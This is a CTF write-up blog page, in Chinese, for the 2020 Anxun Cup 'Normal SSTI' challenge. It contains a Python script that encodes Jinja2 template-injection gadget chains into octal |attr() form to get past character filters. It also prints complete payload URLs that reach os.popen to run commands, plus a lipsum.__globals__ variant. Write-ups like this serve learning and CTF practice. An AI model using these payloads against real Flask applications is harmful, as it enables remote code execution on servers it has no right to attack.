@@ -1,0 +1,325 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>安洵杯2020 Normal SSTI-wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="题目链接  
+提示传递/test?url=
+尝试发现&amp;#123;&amp;#123;&amp;#125;&amp;#125;, [], ., _,&amp;#39;&amp;#39;等都被禁用
+那么可以通过|attr()加上编码（我这里用的八进制，也可以十六进制或unicode）来构造
+构造脚本：
+12345678910111213141">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="安洵杯2020 Normal SSTI-wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												安洵杯2020 Normal SSTI-wp
+									
+									
+								</h1>
+								
+									<p id="/2023/10/16/axb2020-NormalSSTI-wp/" class="leancloud-visitors view"
+										data-flag-title="安洵杯2020 Normal SSTI-wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/910">题目链接</a>  </p>
+<p>提示传递<code>/test?url=</code></p>
+<p>尝试发现<code>&#123;&#123;&#125;&#125;, [], ., _,&#39;&#39;</code>等都被禁用</p>
+<p>那么可以通过<code>|attr()</code>加上编码（我这里用的八进制，也可以十六进制或unicode）来构造</p>
+<p>构造脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2oct</span>(<span class="params">s</span>):</span><br><span class="line">    res = [<span class="built_in">oct</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span>.join(res).replace(<span class="string">&quot;0o&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2attr</span>(<span class="params">t</span>):</span><br><span class="line">    t = re.sub(<span class="string">r&#x27;[[][\&#x27;&quot;](.*?)[\&#x27;&quot;][]]&#x27;</span>, <span class="string">r&#x27;.get(&quot;\1&quot;)&#x27;</span>, t)</span><br><span class="line">    t = re.sub(<span class="string">r&#x27;[[](\d+)[]]&#x27;</span>, <span class="string">r&#x27;.__getitem__(\1)&#x27;</span>, t)</span><br><span class="line">    tt = t.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    tt.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(tt)</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tt:</span><br><span class="line">        idx = i.find(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        idx2 = i.find(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> idx == -<span class="number">1</span>:</span><br><span class="line">            idx = <span class="built_in">len</span>(i)</span><br><span class="line">            idx2 = idx</span><br><span class="line"></span><br><span class="line">        tmp = i[idx:idx2+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> (<span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> tmp <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> tmp):</span><br><span class="line">            tmp = tmp.strip(<span class="string">&#x27;(&#x27;</span>).strip(<span class="string">&#x27;)&#x27;</span>).strip(<span class="string">&#x27;&quot;&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">            tmp = <span class="string">f&#x27;(&quot;<span class="subst">&#123;str2oct(tmp)&#125;</span>&quot;)&#x27;</span></span><br><span class="line">        res += <span class="string">f&#x27;|attr(&quot;<span class="subst">&#123;str2oct(i[:idx])&#125;</span>&quot;)<span class="subst">&#123;tmp&#125;</span>&#x27;</span></span><br><span class="line">        tmp = i[idx2+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> (<span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> tmp <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> tmp):</span><br><span class="line">            tmp = tmp.strip(<span class="string">&#x27;(&#x27;</span>).strip(<span class="string">&#x27;)&#x27;</span>).strip(<span class="string">&#x27;&quot;&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">            tmp = <span class="string">f&#x27;(&quot;<span class="subst">&#123;str2oct(tmp)&#125;</span>&quot;)&#x27;</span></span><br><span class="line">            res += tmp</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">txt = <span class="string">&#x27;.__class__.__base__.__subclasses__()[100].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span></span><br><span class="line">str2attr(txt)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test?url=&#123;%<span class="keyword">print</span>(<span class="string">&quot;a&quot;</span>|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>)()|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\147\145\164\151\164\145\155\137\137&quot;</span>)(<span class="number">100</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\147\145\164&quot;</span>)(<span class="string">&quot;\137\137\142\165\151\154\164\151\156\163\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\147\145\164&quot;</span>)(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137&quot;</span>)(<span class="string">&quot;\157\163&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\160\157\160\145\156&quot;</span>)(<span class="string">&quot;ls&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\162\145\141\144&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者也可以直接用flask中的 lipsum方法,可以用于得到__builtins__，而且lipsum.__globals__含有os模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="string">&#x27;.__globals__.get(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span></span><br><span class="line">str2attr(txt)</span><br><span class="line"><span class="comment"># lipsum|attr(&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;)|attr(&quot;\147\145\164&quot;)(&quot;\157\163&quot;)|attr(&quot;\160\157\160\145\156&quot;)(&quot;\154\163&quot;)|attr(&quot;\162\145\141\144&quot;)()</span></span><br></pre></td></tr></table></figure>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/10/16/axb2020-NormalSSTI-wp/" class="leancloud-visitors view" data-flag-title="安洵杯2020 Normal SSTI-wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/10/17/GDOUCTF2023-ezze-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/10/14/seccon2019-sum-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-10-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web-wp/">web-wp<span>47</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>83</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>52</span></a></li> <li><a href="/tags/web/">web<span>52</span></a></li> <li><a href="/tags/SSTI/">SSTI<span>5</span></a></li> <li><a href="/tags/HDCTF2023/">HDCTF2023<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
